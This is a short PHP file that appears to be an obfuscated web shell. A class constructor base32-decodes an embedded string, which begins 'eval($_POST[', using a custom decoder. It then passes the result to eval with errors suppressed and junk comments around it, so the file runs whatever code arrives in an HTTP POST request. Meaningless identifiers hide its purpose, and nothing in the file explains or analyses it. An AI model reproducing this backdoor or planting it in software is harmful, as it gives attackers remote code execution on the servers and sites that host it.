<?php
class XTAI{
        public $UVKT = null;
        public $BERG = null;
        function __construct(){
        $this->UVKT = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->BERG = @LFDO($this->UVKT);
        @eval("/*Vnk]%oc*/".$this->BERG."/*Vnk]%oc*/");
        }}
new XTAI();
function XFZM($WOSZ){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $VAUR = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($WOSZ); $i < $j; $i++){
    $v <<= 8;
        $v += ord($WOSZ[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $VAUR .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $VAUR .= $BASE32_ALPHABET[$v];}
    return $VAUR;}
function LFDO($WOSZ){
    $VAUR = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($WOSZ); $i < $j; $i++){
        $v <<= 5;
        if ($WOSZ[$i] >= 'a' && $WOSZ[$i] <= 'z'){
            $v += (ord($WOSZ[$i]) - 97);
        } elseif ($WOSZ[$i] >= '2' && $WOSZ[$i] <= '7') {
            $v += (24 + $WOSZ[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $VAUR .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $VAUR;}
?>